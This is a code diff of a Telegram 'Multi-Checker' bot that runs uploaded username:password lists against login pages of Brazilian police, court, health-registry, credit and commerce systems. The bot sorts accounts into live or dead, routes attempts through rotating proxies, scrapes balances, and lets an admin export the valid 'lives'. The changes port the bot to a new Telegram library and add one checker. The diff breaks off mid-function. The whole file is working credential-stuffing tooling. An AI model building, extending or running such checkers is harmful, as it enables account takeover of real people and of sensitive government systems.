@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Telegram Multi-Checker Bot · by slownx
-telebot (pyTelegramBotAPI) · AsyncTeleBot
+python-telegram-bot >= 20.x
 """
 
 import asyncio
@@ -22,8 +22,17 @@ import urllib3
 from bs4 import BeautifulSoup
 from dotenv import load_dotenv
 from requests.adapters import HTTPAdapter
-from telebot import types
-from telebot.async_telebot import AsyncTeleBot
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
+from telegram.ext import (
+    Application,
+    ApplicationHandlerStop,
+    CallbackQueryHandler,
+    CommandHandler,
+    ContextTypes,
+    ConversationHandler,
+    MessageHandler,
+    filters,
+)
 from urllib3.util.ssl_ import create_urllib3_context
 
 load_dotenv()
@@ -57,18 +66,19 @@ DB_PATH  = "bot.db"
 TMP_DIR  = Path("tmp")
 TMP_DIR.mkdir(exist_ok=True)
 
+CHOOSE_CHECKER, WAIT_FILE, CHOOSE_DELIM = range(3)
+
 CHECKERS = {
     "checkok":       "CheckOK",
     "consultcenter": "ConsultCenter",
     "credicorp":     "Credicorp",
-    "correiopmsp":   "Correio PMSP",
     "sisreg":        "SISREG III",
     "tjsp":          "TJSP",
     "sspds":         "SSPDS CE",
     "checkonn":      "CheckONN",
-    "sinesp":        "SINESP",
     "serasa":        "Serasa Empresas",
     "sisbjud":       "SISBAJUD",
+    "verifiedatacado": "Verified Atacado",
 }
 
 # ── Database ────────────────────────────────────────────────────────────────────
@@ -239,7 +249,7 @@ def _proxy_for(uid):
     return {"http": f"http://{p}", "https": f"http://{p}"}
 
 # ── Checker functions ───────────────────────────────────────────────────────────
-# Each returns ("live"|"die"|"erro", extra_str)
+# Each returns ("live"|"die"|"nvinculado"|"erro", extra_str)
 
 def _chk_checkok(user, pwd, px_fn):
     try:
@@ -259,7 +269,9 @@ def _chk_checkok(user, pwd, px_fn):
 
 def _chk_consultcenter(user, pwd, px_fn):
     try:
-        r = requests.post(
+        s  = requests.Session()
+        px = px_fn()
+        r = s.post(
             "https://sistema.consultcenter.com.br/users/login",
             headers={
                 "accept": "text/html,application/xhtml+xml,*/*",
@@ -274,12 +286,19 @@ def _chk_consultcenter(user, pwd, px_fn):
                 f"&data%5BUsuarioLogin%5D%5Busername%5D={user}"
                 f"&data%5BUsuarioLogin%5D%5Bpassword%5D={pwd}"
             ),
-            proxies=px_fn(), timeout=15,
+            proxies=px, timeout=15,
         )
         html = r.text.lower()
-        if "senha incorretos" not in html and "bloqueado" not in html:
-            return ("live", "")
-        return ("die", "")
+        if "senha incorretos" in html or "bloqueado" in html:
+            return ("die", "")
+
+        # The "faturas em aberto" alert is a CakePHP flash message: it only
+        # renders once, on the page the login redirect lands on (r.text,
+        # since requests follows redirects by default). A second GET to
+        # /portal arrives after the flash was already consumed/cleared by
+        # the server, so it must NOT be fetched separately.
+        faturas = "faturas_abertoMessage" in r.text
+        return ("live", "faturas em aberto" if faturas else "sem faturas em aberto")
     except Exception as e:
         return ("erro", str(e)[:60])
 
@@ -420,28 +439,14 @@ def _chk_sinesp(user, pwd, px_fn):
             "senha":       pwd,
             "usuario":     usuario,
         }, separators=(",", ":")).encode("utf-8")
-        px = px_fn()
-        retries = urllib3.Retry(total=1, connect=1, read=1)
-        if px:
-            proxy_url = px.get("https") or px.get("http")
-            http = urllib3.ProxyManager(
-                proxy_url,
-                cert_reqs="CERT_NONE", assert_hostname=False,
-                timeout=urllib3.Timeout(connect=15, read=30),
-                retries=retries,
-            )
-            url = "https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile"
-        else:
-            http = urllib3.HTTPSConnectionPool(
-                "seguranca.sinesp.gov.br", port=443,
-                cert_reqs="CERT_NONE", assert_hostname=False,
-                timeout=urllib3.Timeout(connect=15, read=30),
-                retries=retries,
-            )
-            url = "/sinesp-seguranca/api/sessao_autenticada/mobile"
+        http = urllib3.HTTPSConnectionPool(
+            "seguranca.sinesp.gov.br", port=443,
+            cert_reqs="CERT_NONE", assert_hostname=False,
+            timeout=urllib3.Timeout(connect=15, read=30),
+        )
         resp = http.urlopen(
             "POST",
-            url,
+            "/sinesp-seguranca/api/sessao_autenticada/mobile",
             body=body,
             headers={
                 "host":            "seguranca.sinesp.gov.br",
@@ -458,6 +463,8 @@ def _chk_sinesp(user, pwd, px_fn):
         text = raw.decode("utf-8", errors="replace")
         if "MOB411" in text:
             return ("die", "")
+        if "Usuário não vinculado ao sistema" in text:
+            return ("nvinculado", "")
         data  = json.loads(text)
         token = data.get("token")
         if resp.status == 200 and token and token != "null":
@@ -578,18 +585,43 @@ def _chk_sisbjud(user, pwd, px_fn):
     except Exception as e:
         return ("erro", str(e)[:60])
 
+def _chk_verifiedatacado(user, pwd, px_fn):
+    try:
+        s = requests.Session()
+        px = px_fn()
+        r = s.get("https://verifiedatacado.com/", proxies=px, timeout=15)
+        soup = BeautifulSoup(r.text, "html.parser")
+        csrf_input = soup.find("input", {"name": "_csrf"})
+        if not csrf_input:
+            return ("erro", "sem csrf token")
+        csrf = csrf_input.get("value")
+        r2 = s.post(
+            "https://verifiedatacado.com/",
+            data={"email": user, "password": pwd, "_csrf": csrf},
+            proxies=px, timeout=15, allow_redirects=False
+        )
+        if r2.status_code == 401:
+            return ("die", "")
+        r3 = s.get("https://verifiedatacado.com/massorder", proxies=px, timeout=15)
+        soup3 = BeautifulSoup(r3.text, "html.parser")
+        saldo_elem = soup3.find("span", {"class": "saldo"})
+        if saldo_elem:
+            return ("live", f"saldo:{saldo_elem.text.strip()}")
+        return ("live", "")
+    except Exception as e:
+        return ("erro", str(e)[:60])
+
 CHECKER_FN = {
     "checkok":       _chk_checkok,
     "consultcenter": _chk_consultcenter,
     "credicorp":     _chk_credicorp,
-    "correiopmsp":   _chk_correiopmsp,
     "sisreg":        _chk_sisreg,
     "tjsp":          _chk_tjsp,
     "sspds":         _chk_sspds,
     "checkonn":      _chk_checkonn,
-    "sinesp":        _chk_sinesp,
     "serasa":        _chk_serasa,
     "sisbjud":       _chk_sisbjud,
+    "verifiedatacado": _chk_verifiedatacado,
 }
 
 # ── Proxy generator (admin only) ────────────────────────────────────────────────
@@ -638,18 +670,6 @@ def _check_proxy_alive(proxy):
     except Exception:
         return False
 
-# ── Session state (in-memory, per-user) ─────────────────────────────────────────
-_user_data: dict[int, dict] = {}
-
-def _ud(uid):
-    return _user_data.setdefault(uid, {})
-
-def _ud_clear(uid):
-    _user_data.pop(uid, None)
-
-# ── Bot init ────────────────────────────────────────────────────────────────────
-bot = AsyncTeleBot(TOKEN)
-
 # ── Keyboards ───────────────────────────────────────────────────────────────────
 def _kb_checkers(uid):
     chks = get_user_checkers(uid)
@@ -657,47 +677,47 @@ def _kb_checkers(uid):
         return None
     rows = []
     for i in range(0, len(chks), 2):
-        row = [types.InlineKeyboardButton(CHECKERS[chks[i]], callback_data=f"chk:{chks[i]}")]
+        row = [InlineKeyboardButton(CHECKERS[chks[i]], callback_data=f"chk:{chks[i]}")]
         if i + 1 < len(chks):
-            row.append(types.InlineKeyboardButton(CHECKERS[chks[i + 1]], callback_data=f"chk:{chks[i + 1]}"))
+            row.append(InlineKeyboardButton(CHECKERS[chks[i + 1]], callback_data=f"chk:{chks[i + 1]}"))
         rows.append(row)
-    rows.append([types.InlineKeyboardButton("❌ Cancelar", callback_data="chk:cancel")])
-    return types.InlineKeyboardMarkup(rows)
+    rows.append([InlineKeyboardButton("❌ Cancelar", callback_data="chk:cancel")])
+    return InlineKeyboardMarkup(rows)
 
 def _kb_delim():
-    return types.InlineKeyboardMarkup([
+    return InlineKeyboardMarkup([
         [
-            types.InlineKeyboardButton("  :  ", callback_data="dl::"),
-            types.InlineKeyboardButton("  ;  ", callback_data="dl:;"),
-            types.InlineKeyboardButton("  |  ", callback_data="dl:|"),
+            InlineKeyboardButton("  :  ", callback_data="dl::"),
+            InlineKeyboardButton("  ;  ", callback_data="dl:;"),
+            InlineKeyboardButton("  |  ", callback_data="dl:|"),
         ],
-        [types.InlineKeyboardButton("❌ Cancelar", callback_data="dl:cancel")],
+        [InlineKeyboardButton("❌ Cancelar", callback_data="dl:cancel")],
     ])
 
 def _kb_admin():
-    return types.InlineKeyboardMarkup([
+    return InlineKeyboardMarkup([
         [
-            types.InlineKeyboardButton("👥 Usuários",      callback_data="adm:users"),
-            types.InlineKeyboardButton("🌐 Gerar Proxies", callback_data="adm:proxygen"),
+            InlineKeyboardButton("👥 Usuários",      callback_data="adm:users"),
+            InlineKeyboardButton("🌐 Gerar Proxies", callback_data="adm:proxygen"),
         ],
         [
-            types.InlineKeyboardButton("📦 CX2 Lives",     callback_data="adm:cx2"),
-            types.InlineKeyboardButton("📊 Status",        callback_data="adm:status"),
+            InlineKeyboardButton("📦 CX2 Lives",     callback_data="adm:cx2"),
+            InlineKeyboardButton("📊 Status",        callback_data="adm:status"),
         ],
-        [types.InlineKeyboardButton("🌍 Modo Público",     callback_data="adm:public")],
+        [InlineKeyboardButton("🌍 Modo Público",     callback_data="adm:public")],
     ])
 
 def _kb_public():
     rows = []
     on = is_public_mode()
-    rows.append([types.InlineKeyboardButton(
+    rows.append([InlineKeyboardButton(
         "🟢 Ativado (todos usam)" if on else "🔴 Desativado (só autorizados)",
         callback_data="pub:toggle",
     )])
 
     pub_checkers = get_public_checkers()
     btns = [
-        types.InlineKeyboardButton(
+        InlineKeyboardButton(
             f"{'✅' if k in pub_checkers else '➕'}  {name}",
             callback_data=f"pub:chk:{k}",
         )
@@ -715,35 +735,35 @@ def _kb_public():
         row = []
         for n in thread_opts[i:i + 4]:
             icon = "🔵" if current_threads == n else "⚪"
-            row.append(types.InlineKeyboardButton(f"{icon}{n}T", callback_data=f"pub:thd:{n}"))
+            row.append(InlineKeyboardButton(f"{icon}{n}T", callback_data=f"pub:thd:{n}"))
         rows.append(row)
 
-    rows.append([types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
-    return types.InlineKeyboardMarkup(rows)
+    rows.append([InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
+    return InlineKeyboardMarkup(rows)
 
 def _kb_cx2(count):
-    return types.InlineKeyboardMarkup([
+    return InlineKeyboardMarkup([
         [
-            types.InlineKeyboardButton(f"📥 Exportar ({count})", callback_data="adm:cx2export"),
-            types.InlineKeyboardButton("🔀 Testar lista",        callback_data="adm:cx2test"),
+            InlineKeyboardButton(f"📥 Exportar ({count})", callback_data="adm:cx2export"),
+            InlineKeyboardButton("🔀 Testar lista",        callback_data="adm:cx2test"),
         ],
-        [types.InlineKeyboardButton("🗑️ Limpar tudo",           callback_data="adm:cx2clear")],
-        [types.InlineKeyboardButton("🔙 Voltar",                callback_data="adm:back")],
+        [InlineKeyboardButton("🗑️ Limpar tudo",           callback_data="adm:cx2clear")],
+        [InlineKeyboardButton("🔙 Voltar",                callback_data="adm:back")],
     ])
 
 def _kb_users(users):
     rows = []
     for uid, uname, fname, is_a in users:
         label = f"{'✅' if is_a else '❌'}  {fname or uname or uid}"
-        rows.append([types.InlineKeyboardButton(label, callback_data=f"usr:{uid}")])
-    rows.append([types.InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
-    return types.InlineKeyboardMarkup(rows)
+        rows.append([InlineKeyboardButton(label, callback_data=f"usr:{uid}")])
+    rows.append([InlineKeyboardButton("🔙 Voltar", callback_data="adm:back")])
+    return InlineKeyboardMarkup(rows)
 
 def _kb_manage(target_uid, is_a):
     rows = []
 
     # Auth toggle
-    rows.append([types.InlineKeyboardButton(
+    rows.append([InlineKeyboardButton(
         "🔴 Revogar acesso" if is_a else "🟢 Autorizar acesso",
         callback_data=f"auth:{target_uid}:{'0' if is_a else '1'}",
     )])
@@ -755,14 +775,14 @@ def _kb_manage(target_uid, is_a):
         row = []
         for n in thread_opts[i:i + 4]:
             icon = "🔵" if current_threads == n else "⚪"
-            row.append(types.InlineKeyboardButton(f"{icon}{n}T", callback_data=f"thd:{target_uid}:{n}"))
+            row.append(InlineKeyboardButton(f"{icon}{n}T", callback_data=f"thd:{target_uid}:{n}"))
         rows.append(row)
 
     # Checker permissions
     perm_rows = _db("SELECT checker, enabled FROM permissions WHERE user_id=?", target_uid, fetch="all") or []
     perm_map  = {r[0]: r[1] for r in perm_rows}
     btns = [
-        types.InlineKeyboardButton(
+        InlineKeyboardButton(
             f"{'✅' if perm_map.get(k, 0) else '➕'}  {name}",
             callback_data=f"perm:{target_uid}:{k}",
         )
@@ -776,92 +796,73 @@ def _kb_manage(target_uid, is_a):
 
     # Delete user proxies
     px_count = len(get_user_proxies(target_uid))
-    rows.append([types.InlineKeyboardButton(
+    rows.append([InlineKeyboardButton(
         f"🗑️ Limpar proxies ({px_count})" if px_count else "🗑️ Sem proxies (vazio)",
         callback_data=f"delpx:{target_uid}",
     )])
 
-    rows.append([types.InlineKeyboardButton("🔙 Usuários", callback_data="adm:users")])
-    return types.InlineKeyboardMarkup(rows)
-
-# ── Small helpers ────────────────────────────────────────────────────────────────
-async def _download_document(document) -> bytes:
-    file_info = await bot.get_file(document.file_id)
-    return await bot.download_file(file_info.file_path)
-
-async def _edit(chat_id, message_id, text, **kwargs):
-    try:
-        await bot.edit_message_text(text, chat_id=chat_id, message_id=message_id, **kwargs)
-    except Exception:
-        pass
+    rows.append([InlineKeyboardButton("🔙 Usuários", callback_data="adm:users")])
+    return InlineKeyboardMarkup(rows)
 
 # ── Command handlers ────────────────────────────────────────────────────────────
-@bot.message_handler(commands=["start"])
-async def cmd_start(message):
-    u   = message.from_user
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    u   = update.effective_user
     uid = u.id
     ensure_user(uid, u.username, u.full_name)
 
     if not is_auth(uid):
-        await bot.reply_to(
-            message,
+        await update.message.reply_text(
             f"⛔ *Acesso negado.*\nSolicite acesso ao admin.\n\n`Seu ID: {uid}`",
             parse_mode="Markdown",
         )
-        return
+        return ConversationHandler.END
 
     chks = get_user_checkers(uid)
     if not chks:
-        await bot.reply_to(message, "⚠️ Nenhum checker liberado. Aguarde o admin.")
-        return
+        await update.message.reply_text("⚠️ Nenhum checker liberado. Aguarde o admin.")
+        return ConversationHandler.END
 
-    _ud_clear(uid)
     px_count = len(get_user_proxies(uid))
     px_text  = f"✅ {px_count} proxies" if px_count else "❌ sem proxies · /myproxy"
-    await bot.reply_to(
-        message,
+    await update.message.reply_text(
         f"🔍 *Escolha o checker:*\n\n🌐 {px_text}",
         parse_mode="Markdown",
         reply_markup=_kb_checkers(uid),
     )
+    return CHOOSE_CHECKER
 
-@bot.message_handler(commands=["admin"])
-async def cmd_admin(message):
-    uid = message.from_user.id
+async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
     if not is_admin(uid):
         return
     total  = len(list_users())
     authed = sum(1 for u in list_users() if u[3])
-    await bot.reply_to(
-        message,
+    await update.message.reply_text(
         f"⚡ *Painel Admin*\n`Total: {total}  |  Auth: {authed}`",
         parse_mode="Markdown",
         reply_markup=_kb_admin(),
     )
 
-@bot.message_handler(commands=["myproxy"])
-async def cmd_myproxy(message):
-    uid = message.from_user.id
+async def cmd_myproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
     if not is_auth(uid):
         return
     px_count = len(get_user_proxies(uid))
-    _ud(uid)["waiting_proxy"] = True
+    ctx.user_data["waiting_proxy"] = True
     status = f"✅ {px_count} proxies ativos" if px_count else "❌ Sem proxies"
     kb = None
     if px_count:
-        kb = types.InlineKeyboardMarkup([[
-            types.InlineKeyboardButton("🗑️ Limpar proxies", callback_data="px:clear")
+        kb = InlineKeyboardMarkup([[
+            InlineKeyboardButton("🗑️ Limpar proxies", callback_data="px:clear")
         ]])
-    await bot.reply_to(
-        message,
+    await update.message.reply_text(
         f"🌐 *Gerenciar Proxies*\n{status}\n\nEnvie um arquivo *.txt* com proxies (`ip:porta` por linha).",
         parse_mode="Markdown",
         reply_markup=kb,
     )
 
-@bot.message_handler(commands=["perfil"])
-async def cmd_perfil(message):
-    u   = message.from_user
+async def cmd_perfil(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    u   = update.effective_user
     uid = u.id
     ensure_user(uid, u.username, u.full_name)
     px_count = len(get_user_proxies(uid))
@@ -869,8 +870,7 @@ async def cmd_perfil(message):
     if is_admin(uid):
         users  = list_users()
         authed = sum(1 for x in users if x[3])
-        await bot.reply_to(
-            message,
+        await update.message.reply_text(
             f"👑 *Perfil Admin*\n"
             f"```\n"
             f"Nome     : {u.full_name or u.username or uid}\n"
@@ -886,7 +886,7 @@ async def cmd_perfil(message):
 
     row = _db("SELECT username, full_name, is_auth, added_at, threads FROM users WHERE user_id=?", uid, fetch="one")
     if not row:
-        await bot.reply_to(message, "❌ Usuário não encontrado.")
+        await update.message.reply_text("❌ Usuário não encontrado.")
         return
     uname, fname, is_a, added_at, threads = row
     chks     = get_user_checkers(uid)
@@ -897,8 +897,7 @@ async def cmd_perfil(message):
         status_txt = "🌍 Público"
     else:
         status_txt = "❌ Bloqueado"
-    await bot.reply_to(
-        message,
+    await update.message.reply_text(
         f"👤 *Meu Perfil*\n"
         f"```\n"
         f"Nome     : {fname or uname or uid}\n"
@@ -912,233 +911,111 @@ async def cmd_perfil(message):
         parse_mode="Markdown",
     )
 
-@bot.message_handler(commands=["cancel"])
-async def cmd_cancel(message):
-    uid = message.from_user.id
-    tmp = _ud(uid).pop("tmp_file", None)
+async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    tmp = ctx.user_data.pop("tmp_file", None)
     if tmp:
         Path(tmp).unlink(missing_ok=True)
-    _ud_clear(uid)
-    await bot.reply_to(message, "❌ Cancelado.")
+    ctx.user_data.clear()
+    await update.message.reply_text("❌ Cancelado.")
+    return ConversationHandler.END
 
-# ── Document handler ────────────────────────────────────────────────────────────
-@bot.message_handler(content_types=["document"])
-async def on_document(message):
-    u   = message.from_user
-    uid = u.id
-    ensure_user(uid, u.username, u.full_name)
-    data = _ud(uid)
-    doc  = message.document
+# ── Proxy document handler (runs in group -1, BEFORE the conversation) ──────────
+async def handle_proxy_upload(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Intercepts document uploads for proxy and CX2 test flows before the conv handler."""
+    waiting_proxy = ctx.user_data.get("waiting_proxy")
+    waiting_cx2   = ctx.user_data.get("waiting_cx2_test")
+    if not waiting_proxy and not waiting_cx2:
+        return  # not for us — let the conv handler proceed
 
-    # 1) admin testing a credential list against every checker (CX2)
-    if data.pop("waiting_cx2_test", False):
+    uid = update.effective_user.id
+
+    if waiting_cx2:
+        ctx.user_data.pop("waiting_cx2_test")
         if not is_admin(uid):
-            return
-        raw = await _download_document(doc)
+            raise ApplicationHandlerStop
+        doc = update.message.document
+        f   = await doc.get_file()
         tmp = TMP_DIR / f"cx2test_{uid}_{int(time.time())}.txt"
-        tmp.write_bytes(raw)
-        data["cx2_test_file"] = str(tmp)
-        await bot.reply_to(
-            message,
+        await f.download_to_drive(str(tmp))
+        ctx.user_data["cx2_test_file"] = str(tmp)
+        await update.message.reply_text(
             "🔤 Qual o *delimitador*?",
             parse_mode="Markdown",
-            reply_markup=types.InlineKeyboardMarkup([[
-                types.InlineKeyboardButton("  :  ", callback_data="cx2dl::"),
-                types.InlineKeyboardButton("  ;  ", callback_data="cx2dl:;"),
-                types.InlineKeyboardButton("  |  ", callback_data="cx2dl:|"),
+            reply_markup=InlineKeyboardMarkup([[
+                InlineKeyboardButton("  :  ", callback_data="cx2dl::"),
+                InlineKeyboardButton("  ;  ", callback_data="cx2dl:;"),
+                InlineKeyboardButton("  |  ", callback_data="cx2dl:|"),
             ]]),
         )
-        return
+        raise ApplicationHandlerStop
 
-    # 2) user uploading their own proxy list
-    if data.pop("waiting_proxy", False):
-        if not is_auth(uid):
-            return
-        raw  = await _download_document(doc)
-        text = raw.decode("utf-8", errors="ignore")
-
-        lines = [l.strip() for l in text.splitlines() if l.strip()]
-        if not lines:
-            await bot.reply_to(message, "⚠️ Arquivo vazio ou sem proxies válidos.")
-            return
-
-        data["pending_proxies"] = text
-        await bot.reply_to(
-            message,
-            f"📋 *{len(lines)} proxies encontrados.*\nO que deseja fazer?",
-            parse_mode="Markdown",
-            reply_markup=types.InlineKeyboardMarkup([[
-                types.InlineKeyboardButton("🔍 Testar conectividade", callback_data="px:test"),
-                types.InlineKeyboardButton("✅ Salvar direto",        callback_data="px:save"),
-            ]]),
-        )
-        return
-
-    # 3) regular checker flow (credential list)
     if not is_auth(uid):
-        await bot.reply_to(message, f"⛔ Sem acesso. `ID: {uid}`", parse_mode="Markdown")
-        return
+        ctx.user_data.pop("waiting_proxy", None)
+        raise ApplicationHandlerStop
 
-    if not doc.file_name.lower().endswith(".txt"):
-        await bot.reply_to(message, "⚠️ Envie um arquivo *.txt*", parse_mode="Markdown")
-        return
+    ctx.user_data.pop("waiting_proxy")
+    doc = update.message.document
+    f   = await doc.get_file()
+    tmp = TMP_DIR / f"proxy_{uid}.txt"
+    await f.download_to_drive(str(tmp))
+    text  = tmp.read_text(encoding="utf-8", errors="ignore")
+    tmp.unlink(missing_ok=True)
 
-    raw = await _download_document(doc)
-    tmp = TMP_DIR / f"in_{uid}_{int(time.time())}.txt"
-    tmp.write_bytes(raw)
-    data["tmp_file"] = str(tmp)
+    lines = [l.strip() for l in text.splitlines() if l.strip()]
+    if not lines:
+        await update.message.reply_text("⚠️ Arquivo vazio ou sem proxies válidos.")
+        raise ApplicationHandlerStop
 
-    # new flow: checker already chosen → ask delimiter
-    if data.get("checker"):
-        ck = data["checker"]
-        await bot.reply_to(
-            message,
-            f"✅ *{CHECKERS[ck]}*\n\n🔤 Qual o *delimitador*?",
-            parse_mode="Markdown",
-            reply_markup=_kb_delim(),
-        )
-        return
-
-    # legacy flow: file sent first → show checkers
-    chks = get_user_checkers(uid)
-    if not chks:
-        await bot.reply_to(message, "⚠️ Nenhum checker liberado. Aguarde o admin.")
-        return
-
-    await bot.reply_to(
-        message,
-        "🔍 *Escolha o checker:*",
+    ctx.user_data["pending_proxies"] = text
+    await update.message.reply_text(
+        f"📋 *{len(lines)} proxies encontrados.*\nO que deseja fazer?",
         parse_mode="Markdown",
-        reply_markup=_kb_checkers(uid),
+        reply_markup=InlineKeyboardMarkup([[
+            InlineKeyboardButton("🔍 Testar conectividade", callback_data="px:test"),
+            InlineKeyboardButton("✅ Salvar direto",        callback_data="px:save"),
+        ]]),
     )
-
-# ── Callback query dispatcher ───────────────────────────────────────────────────
-@bot.callback_query_handler(func=lambda call: True)
-async def on_callback(call):
-    d = call.data or ""
-    if d.startswith("chk:"):
-        await on_checker_chosen(call)
-    elif d.startswith("dl:"):
-        await on_delim_chosen(call)
-    elif d.startswith("px:"):
-        await on_proxy_cb(call)
-    elif d.startswith("cx2dl:"):
-        await on_cx2_delim_cb(call)
-    elif d.startswith("pub:"):
-        await on_public_cb(call)
-    elif d.startswith(("adm:", "usr:", "auth:", "perm:", "thd:", "delpx:")):
-        await on_admin_cb(call)
-    else:
-        await bot.answer_callback_query(call.id)
-
-async def on_checker_chosen(call):
-    uid = call.from_user.id
-    val = call.data.split(":", 1)[1]
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    data = _ud(uid)
-
-    if val == "cancel":
-        await bot.answer_callback_query(call.id)
-        tmp = data.pop("tmp_file", None)
-        if tmp:
-            Path(tmp).unlink(missing_ok=True)
-        _ud_clear(uid)
-        await _edit(chat_id, message_id, "❌ Cancelado.")
-        return
-
-    if val not in get_user_checkers(uid):
-        await bot.answer_callback_query(call.id, "⛔ Sem permissão para este checker.", show_alert=True)
-        return
-
-    await bot.answer_callback_query(call.id)
-    data["checker"] = val
-
-    if data.get("tmp_file"):
-        await _edit(
-            chat_id, message_id,
-            f"✅ *{CHECKERS[val]}*\n\n🔤 Qual o *delimitador*?",
-            parse_mode="Markdown",
-            reply_markup=_kb_delim(),
-        )
-        return
-
-    await _edit(
-        chat_id, message_id,
-        f"✅ *{CHECKERS[val]}*\n\n📂 Agora envie o arquivo *.txt* com as credenciais.",
-        parse_mode="Markdown",
-    )
-
-async def on_delim_chosen(call):
-    await bot.answer_callback_query(call.id)
-    uid = call.from_user.id
-    val = call.data.split(":", 1)[1]
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    data = _ud(uid)
-
-    if val == "cancel":
-        tmp = data.pop("tmp_file", None)
-        if tmp:
-            Path(tmp).unlink(missing_ok=True)
-        _ud_clear(uid)
-        await _edit(chat_id, message_id, "❌ Cancelado.")
-        return
-
-    checker  = data.pop("checker", None)
-    tmp_file = data.pop("tmp_file", None)
-
-    if not checker or not tmp_file:
-        await _edit(chat_id, message_id, "❌ Erro interno. Tente novamente.")
-        _ud_clear(uid)
-        return
-
-    await _edit(
-        chat_id, message_id,
-        f"⏳ *{CHECKERS[checker]}* iniciando com delimitador `{val}`...",
-        parse_mode="Markdown",
-    )
-
-    asyncio.create_task(_run_checker(chat_id, uid, checker, tmp_file, val))
+    raise ApplicationHandlerStop
 
 # ── Proxy action callback ───────────────────────────────────────────────────────
-async def on_proxy_cb(call):
-    await bot.answer_callback_query(call.id)
-    uid = call.from_user.id
+async def on_proxy_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid    = q.from_user.id
     if not is_auth(uid):
         return
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    data   = _ud(uid)
-    action = call.data.split(":", 1)[1]
+    action = q.data.split(":", 1)[1]
 
     if action == "clear":
         set_user_proxies(uid, "")
-        await _edit(chat_id, message_id, "🗑️ Proxies removidos. Checagens vão direto, sem proxy.")
+        await q.edit_message_text("🗑️ Proxies removidos. Checagens vão direto, sem proxy.")
 
     elif action == "save":
-        text = data.pop("pending_proxies", "")
+        text = ctx.user_data.pop("pending_proxies", "")
         set_user_proxies(uid, text)
         count = len([l for l in text.splitlines() if l.strip()])
-        await _edit(chat_id, message_id, f"✅ {count} proxies salvos!")
+        await q.edit_message_text(f"✅ {count} proxies salvos!")
 
     elif action == "test":
-        text    = data.pop("pending_proxies", "")
+        text    = ctx.user_data.pop("pending_proxies", "")
         proxies = [l.strip() for l in text.splitlines() if l.strip()]
         if not proxies:
-            await _edit(chat_id, message_id, "⚠️ Nenhum proxy para testar.")
+            await q.edit_message_text("⚠️ Nenhum proxy para testar.")
             return
-        await _edit(chat_id, message_id, f"🔍 Testando {len(proxies)} proxies... aguarde ⏳")
-        asyncio.create_task(_run_proxy_test(uid, proxies, chat_id))
+        await q.edit_message_text(f"🔍 Testando {len(proxies)} proxies... aguarde ⏳")
+        asyncio.create_task(_run_proxy_test(uid, proxies, q.message.chat_id, ctx.application))
 
 # ── CX2 delimiter callback ─────────────────────────────────────────────────────
-async def on_cx2_delim_cb(call):
-    await bot.answer_callback_query(call.id)
-    uid = call.from_user.id
+async def on_cx2_delim_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
     if not is_admin(uid):
         return
-    chat_id, message_id = call.message.chat.id, call.message.message_id
-    delim    = call.data.split(":", 1)[1]
-    tmp_file = _ud(uid).pop("cx2_test_file", None)
+    delim    = q.data.split(":", 1)[1]
+    tmp_file = ctx.user_data.pop("cx2_test_file", None)
     if not tmp_file:
-        await _edit(chat_id, message_id, "❌ Arquivo não encontrado. Tente novamente.")
+        await q.edit_message_text("❌ Arquivo não encontrado. Tente novamente.")
         return
     path = Path(tmp_file)
     try:
@@ -1147,22 +1024,133 @@ async def on_cx2_delim_cb(call):
     finally:
         path.unlink(missing_ok=True)
     if not lines:
-        await _edit(chat_id, message_id, "⚠️ Nenhuma credencial válida encontrada.")
+        await q.edit_message_text("⚠️ Nenhuma credencial válida encontrada.")
         return
-    await _edit(
-        chat_id, message_id,
+    await q.edit_message_text(
         f"🔀 *CX2 Multi* iniciando com delimitador `{delim}`...", parse_mode="Markdown"
     )
-    asyncio.create_task(_run_cx2(chat_id, uid, lines, delim))
+    asyncio.create_task(_run_cx2(q.message.chat_id, uid, lines, delim, ctx.application))
+
+# ── Document handler (inside ConversationHandler) ───────────────────────────────
+async def on_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    u   = update.effective_user
+    uid = u.id
+    ensure_user(uid, u.username, u.full_name)
+
+    if not is_auth(uid):
+        await update.message.reply_text(
+            f"⛔ Sem acesso. `ID: {uid}`", parse_mode="Markdown"
+        )
+        return ConversationHandler.END
+
+    doc = update.message.document
+    if not doc.file_name.lower().endswith(".txt"):
+        await update.message.reply_text("⚠️ Envie um arquivo *.txt*", parse_mode="Markdown")
+        return ConversationHandler.END
+
+    f   = await doc.get_file()
+    tmp = TMP_DIR / f"in_{uid}_{int(time.time())}.txt"
+    await f.download_to_drive(str(tmp))
+    ctx.user_data["tmp_file"] = str(tmp)
+
+    # new flow: checker already chosen → ask delimiter
+    if ctx.user_data.get("checker"):
+        ck = ctx.user_data["checker"]
+        await update.message.reply_text(
+            f"✅ *{CHECKERS[ck]}*\n\n🔤 Qual o *delimitador*?",
+            parse_mode="Markdown",
+            reply_markup=_kb_delim(),
+        )
+        return CHOOSE_DELIM
+
+    # legacy flow: file sent first → show checkers
+    chks = get_user_checkers(uid)
+    if not chks:
+        await update.message.reply_text("⚠️ Nenhum checker liberado. Aguarde o admin.")
+        return ConversationHandler.END
+
+    await update.message.reply_text(
+        "🔍 *Escolha o checker:*",
+        parse_mode="Markdown",
+        reply_markup=_kb_checkers(uid),
+    )
+    return CHOOSE_CHECKER
+
+async def on_checker_chosen(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q   = update.callback_query
+    await q.answer()
+    uid = q.from_user.id
+    val = q.data.split(":", 1)[1]
+
